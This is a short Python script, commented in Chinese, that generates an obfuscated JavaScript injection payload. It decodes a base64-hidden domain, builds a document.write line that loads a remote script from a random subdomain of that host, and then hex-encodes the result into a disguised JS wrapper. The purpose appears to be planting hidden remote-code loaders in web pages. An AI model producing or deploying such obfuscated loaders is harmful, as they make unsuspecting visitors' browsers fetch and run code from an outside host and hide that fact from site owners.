#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

import random
import base64
import binascii

def sjs_random(zd0,zd1):  #获取随机数
    return random.randint(zd0, zd1)

def sj_az_AZ(Z1):  #随机抽取字符串
    s = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    return ''.join(random.sample(s,sjs_random(3,Z1)))

def for_str(data):  #字符串转换成16进制
    my_str=""
    for i, ch in enumerate(data):
        as_16=ASCII_16(ch) #ASCII转换成16进制
        my_str = my_str + as_16
    return my_str

def ASCII_16(string_num): #ASCII转换成16进制
    return "\\x"+binascii.b2a_hex(string_num)

if __name__ == "__main__":
    s2 = base64.decodestring("d2Vic2NhbjE5ODkudXMvVE9N") #解密   webscan1989.us/TOM
    data='document.write(\'<script type="text/javascript" src="http://%s.%s/ip.php"></script>\');'%(sj_az_AZ(6),s2)
    #data='<script type="text/javascript" src="http://%s.%s/ip.php"></script>'%(sj_az_AZ(6),"webscan1989.us/TOM")
    #<script type="text/javascript" src="http://www.webscan1989.us/TOM/ip.php"></script>
    print data
    data2="\r\nvar _$=['%s'];document.write( _$[0]);"%(for_str(data))  #字符串转换成16进制
    print data2